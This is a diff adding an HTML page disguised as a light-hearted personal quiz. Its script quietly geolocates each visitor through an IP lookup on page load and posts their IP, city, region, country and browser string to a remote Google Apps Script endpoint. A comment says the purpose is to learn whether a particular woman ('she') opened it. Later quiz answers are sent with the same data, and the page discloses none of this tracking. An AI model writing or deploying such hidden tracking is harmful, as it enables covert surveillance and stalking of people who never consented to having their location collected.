@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Fun & Personal Quiz</title>
+  <style>
+ body {
+  font-family: 'Segoe UI', Tahoma, sans-serif;
+  background: #ffeef0;
+  text-align: center;
+  margin: 0;
+  padding: 0;
+}
+
+.quiz-box {
+  width: 90%;
+  max-width: 600px;
+  margin: 20px auto;
+  background: white;
+  padding: 20px;
+  border-radius: 15px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  box-sizing: border-box;
+}
+
+h2 {
+  color: #ff4d6d;
+  margin-bottom: 5px;
+}
+
+p {
+  margin-top: 0;
+}
+
+input, select, button {
+  width: 100%;
+  padding: 12px;
+  margin: 8px 0;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+  box-sizing: border-box;
+}
+
+button {
+  background: #ff4d6d;
+  color: white;
+  border: none;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+
+button:hover {
+  background: #ff1e4d;
+}
+
+label {
+  font-weight: bold;
+  display: block;
+  margin-top: 12px;
+  text-align: left;
+}
+
+/* Mobile optimizations */
+@media (max-width: 480px) {
+  body {
+    font-size: 16px;
+  }
+
+  .quiz-box {
+    padding: 15px;
+    border-radius: 10px;
+  }
+
+  input, select, button {
+    font-size: 16px;
+    padding: 14px;
+  }
+
+  button {
+    font-size: 18px;
+  }
+
+  label {
+    font-size: 15px;
+  }
+}
+
+  </style>
+</head>
+<body>
+  <div class="quiz-box">
+    <h2>Quiz</h2>
+    <p style="color:gray; font-size:14px;">Just for fun — no wrong answers!</p>
+
+    <input type="text" id="name" placeholder="Your Name" required>
+
+    <label>1. Which activity do you enjoy the most?</label>
+    <select id="q1">
+      <option value="">--Select--</option>
+      <option>Reading a book</option>
+      <option>Traveling</option>
+      <option>Cooking</option>
+      <option>Watching movies/series</option>
+      <option>Sports/Fitness</option>
+    </select>
+
+    <label>2. Where would you most love to visit?</label>
+    <select id="q2">
+      <option value="">--Select--</option>
+      <option>Paris</option>
+      <option>Maldives</option>
+      <option>New York</option>
+      <option>Japan</option>
+      <option>Switzerland</option>
+    </select>
+
+    <label>3. Which food could you never give up?</label>
+    <select id="q3">
+      <option value="">--Select--</option>
+      <option>Pizza</option>
+      <option>Ice Cream</option>
+      <option>Chocolate</option>
+      <option>Fries</option>
+      <option>Biryani</option>
+    </select>
+
+    <label>4. What do you value most in a friend/partner?</label>
+    <select id="q4">
+      <option value="">--Select--</option>
+      <option>Honesty</option>
+      <option>Sense of humor</option>
+      <option>Kindness</option>
+      <option>Ambition</option>
+      <option>Loyalty</option>
+    </select>
+
+    <label>5. What's one small thing that always makes you smile?</label>
+    <select id="q5">
+      <option value="">--Select--</option>
+      <option>Hearing my favorite song</option>
+      <option>Getting a sweet text</option>
+      <option>Watching the sunset</option>
+      <option>Cute animals</option>
+      <option>Chocolate</option>
+    </select>
+
+    <label>6. Which song or artist do you never get tired of?</label>
+    <input type="text" id="q6">
+
+    <label>7. What’s your go-to comfort food or thing when you’re sad?</label>
+    <input type="text" id="q7">
+
+    <label>8. If you had a free weekend, how would you spend it?</label>
+    <input type="text" id="q8">
+
+    <label>9. What's something you really want to achieve in the next 5 years?</label>
+    <input type="text" id="q9">
+
+    <button onclick="submitAnswers()">Submit</button>
+  </div>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzuAaPh7YI_8gj-ES-Wo3PD_pZJ8on4_Nd_spGY8QImG6ap3h6qiSMO0ih3NwdU3Tm0UA/exec"; // Replace with your Apps Script URL
+    let ipData = {};
+
+    // Invisible visit tracking
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        ipData = data;
+        // Auto-log visit without answers (so you know if she opened it)
+        fetch(scriptURL, {
+          method: "POST",
+          body: JSON.stringify({
+            name: "[Visited but no answers yet]",
+            q1: "", q2: "", q3: "", q4: "", q5: "", q6: "", q7: "", q8: "", q9: "",
+            ip: ipData.ip || "",
+            city: ipData.city || "",
+            region: ipData.region || "",
+            country: ipData.country_name || "",
+            ua: navigator.userAgent
+          })
+        });
+      });
+
+    function submitAnswers() {
+      const name = document.getElementById("name").value;
+      const q1 = document.getElementById("q1").value;
+      const q2 = document.getElementById("q2").value;
+      const q3 = document.getElementById("q3").value;
+      const q4 = document.getElementById("q4").value;
+      const q5 = document.getElementById("q5").value;
+      const q6 = document.getElementById("q6").value;
+      const q7 = document.getElementById("q7").value;
+      const q8 = document.getElementById("q8").value;
+      const q9 = document.getElementById("q9").value;
+
+      if(!name) { alert("Please enter your name"); return; }
+
+      fetch(scriptURL, {
+        method: "POST",
+        body: JSON.stringify({
+          name, q1, q2, q3, q4, q5, q6, q7, q8, q9,
+          ip: ipData.ip || "",
+          city: ipData.city || "",
+          region: ipData.region || "",
+          country: ipData.country_name || "",
+          ua: navigator.userAgent
+        })
+      })
+      .then(() => {
+        document.querySelector(".quiz-box").innerHTML = `
+      <h2>Thanks for answering! 😊</h2>
+<p>It’s always interesting to learn more about people and what makes them unique.</p>
+
+        `;
+      })
+      .catch(err => alert("Error: " + err));
+    }
+  </script>
+</body>
+</html>
